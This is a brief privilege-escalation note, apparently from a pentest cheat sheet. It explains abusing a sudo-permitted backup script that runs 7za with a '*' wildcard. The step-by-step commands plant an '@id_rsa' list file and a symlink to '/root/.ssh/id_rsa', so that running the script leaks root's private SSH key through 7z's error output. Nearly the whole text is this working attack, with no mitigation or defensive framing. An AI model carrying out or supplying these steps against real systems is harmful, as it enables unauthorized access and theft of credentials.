This zipping utility can give us privilege escalation vectors when using wildcards like *
```
Identify vulnerable script
(ALL : ALL) NOPASSWD: /usr/bin/usage_management

The scripts run this command:
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *

7z is vulnerable to @files also known as list files pointing to symlinks which are not followed by the -snl option, but with a list files we can tell 7z to disclose files that we make sym links to.

1. Properly identify the folder in which 7z start zipping files from e,g /var/www/html/*
2. create a list file

touch @id_rsa

3. Create sym link.

ln -s /root/.ssh/id_rsa id_rsa

4. Run the binary or command. This will trigger an error disclosing the file contents.
```